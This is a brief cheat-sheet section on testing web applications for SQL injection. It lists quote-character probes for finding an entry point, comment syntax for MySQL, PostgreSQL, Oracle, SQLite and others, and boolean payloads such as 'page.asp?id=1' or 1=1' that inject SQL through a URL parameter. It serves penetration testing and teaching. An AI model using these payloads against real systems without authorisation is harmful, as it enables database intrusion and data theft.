### Test if an application is vulnerable to SQL injection
Possible injection examples to determine an entry point:
```
'
"
`
')
")
`)
'))
"))
`))
```
If you can cause an error by injecting any of the above (or more), then try and fix the error by putting comments in the injection:
```sql
MySQL
#comment
-- comment [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
Standard:
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
